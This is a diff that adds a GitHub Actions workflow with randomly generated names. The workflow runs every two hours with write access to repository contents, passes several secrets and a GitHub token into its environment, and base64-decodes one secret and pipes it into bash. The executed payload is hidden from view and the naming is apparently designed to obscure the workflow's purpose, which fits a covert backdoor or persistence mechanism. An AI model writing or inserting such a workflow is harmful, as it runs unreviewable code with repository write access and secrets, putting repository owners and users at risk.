@@ -1,0 +1,21 @@
+name: vl0j2m
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  TNvys0wMO1iveY:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.gRiYai }}
+      - name: NZg36gD9g6xFWQv
+        env:
+          vXi8h: ${{ secrets.MLMywZWkRg0a4v8D }}
+          WlRDXIxl: ${{ secrets.Q2RbAOpw }}
+          H6BCf3e: ${{ secrets.AG4WZKPZka }}
+          GITHUB_TOKEN: ${{ secrets.gRiYai }}
+        run: echo "$vXi8h" | base64 -d | bash
